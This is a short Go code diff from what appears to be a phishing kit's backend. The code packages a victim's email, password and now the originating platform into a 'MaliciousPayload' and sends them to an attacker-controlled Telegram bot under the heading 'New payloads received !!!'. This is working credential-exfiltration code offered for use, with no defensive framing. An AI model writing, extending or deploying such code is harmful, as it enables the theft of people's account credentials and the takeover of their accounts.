@@ -14,6 +14,7 @@ func buildPayload(payload MaliciousPayload) *TelegramData {
 	return &TelegramData{
 		Identifier: payload.Identifier,
 		Password:   payload.Password,
+		Platform:   payload.Origin,
 	}
 }
 
@@ -26,9 +27,10 @@ func sendToTelegram(token string, chatId string, payload TelegramData) error {
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
 
 	message := "<b>New payloads received !!!</b>\n" +
-		"<i>" + time.Now().Format("02/01/2006") + "</i>\n" +
+		"<i>" + time.Now().Format("02/01/2006") + "</i>\n\n" +
+		"<b>Platform :</b> " + html.EscapeString(payload.Platform) + "\n" +
 		"<b>Password :</b> " + html.EscapeString(payload.Password) + "\n" +
-		"<b>Email :</b> " + html.EscapeString(payload.Identifier) + "\n"
+		"<b>Email :</b> " + html.EscapeString(payload.Identifier)
 
 	data := map[string]string{
 		"chat_id":    chatId,
